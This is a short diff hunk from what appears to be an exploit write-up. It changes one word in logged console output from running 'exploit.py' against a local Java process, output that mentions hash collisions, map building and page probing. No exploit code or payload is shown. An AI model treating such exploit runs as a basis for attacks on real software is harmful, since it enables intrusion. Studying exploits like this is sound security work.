@@ -710,7 +710,7 @@ Length: 12579
 $ python3 exploit.py LOCAL
 
 [+] Starting local process '/usr/bin/java': pid 47406
-[+] Init: Loaded 12579 collisions for page 3876
+[+] Init: Loaded 12579 collisions for hash 3876
 [*] Requesting map of size 7372
 [+] Building map with target page 57639881: Done
 [*] Probing 0ms by removing 1000 pages
